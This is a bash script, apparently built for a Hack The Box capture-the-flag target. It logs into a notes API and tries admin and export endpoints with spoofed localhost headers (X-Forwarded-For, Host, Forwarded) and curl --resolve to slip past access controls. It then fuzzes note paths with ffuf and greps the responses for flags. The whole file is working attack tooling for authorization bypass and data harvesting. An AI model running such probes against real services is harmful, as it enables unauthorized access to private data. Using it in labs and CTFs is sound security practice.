#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
DIR="$OUT_DIR/${IP}_${PORT}_hunt"
mkdir -p "$DIR"
API="http://$IP:$PORT"
# 1) Fresh token
jq -n '{email:"a@a.com",password:"a"}' > "$DIR/body.json"
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$DIR/body.json" "$API/api/auth/login" > "$DIR/login.json"
TOKEN=$(jq -r .token "$DIR/login.json")
# 2) Candidate endpoints and param variants
paths=(
  "/api/notes/all"
  "/api/notes?all=1"
  "/api/notes?admin=1"
  "/api/notes?include=all"
  "/api/notes?limit=1000"
  "/api/admin/notes"
  "/api/flag"
  "/flag"
  "/api/notes/export"
  "/api/notes/internal"
)
# Header sets
hdrs=(
  ""
  "-H X-Forwarded-For:127.0.0.1 -H X-Real-IP:127.0.0.1"
  "-H Host:localhost"
  "--resolve localhost:$PORT:$IP"
  "-H Forwarded:for=127.0.0.1;host=localhost;proto=http"
  "-H X-Forwarded-Proto:http -H X-Forwarded-Port:$PORT"
)
# 3) Try requests
for p in "${paths[@]}"; do
  name=$(echo "$p"|tr -cd 'A-Za-z0-9')
  # plain
  curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $TOKEN" "$API$p" > "$DIR/${name}_plain.head" 2>/dev/null || true
  # with headers
  for h in "${hdrs[@]}"; do
    [ -z "$h" ] && continue
    curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $TOKEN" $h "$API$p" > "$DIR/${name}_$(echo "$h"|tr -cd 'A-Za-z0-9').head" 2>/dev/null || true
  done
  # with resolve authority when specified
  curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" -i -H "Authorization: Bearer $TOKEN" "http://localhost:$PORT$p" > "$DIR/${name}_resolve.head" 2>/dev/null || true
  sleep 0.05
done
# 4) Fuzz /api/notes/FUZZ with small list
printf '%s\n' all admin export internal secret private all.json all.txt debug dump all?limit=999 > "$DIR/notes_words.txt"
ffuf -w "$DIR/notes_words.txt" -u "$API/api/notes/FUZZ" -H "Authorization: Bearer $TOKEN" -ac -mc all -timeout 0 -t 30 -of json -o "$DIR/ffuf_notes.json" || true
# 5) Grep flags
rg -n "HTB\{[^}]+\}" -S "$DIR" | sed -n '1,200p' || true
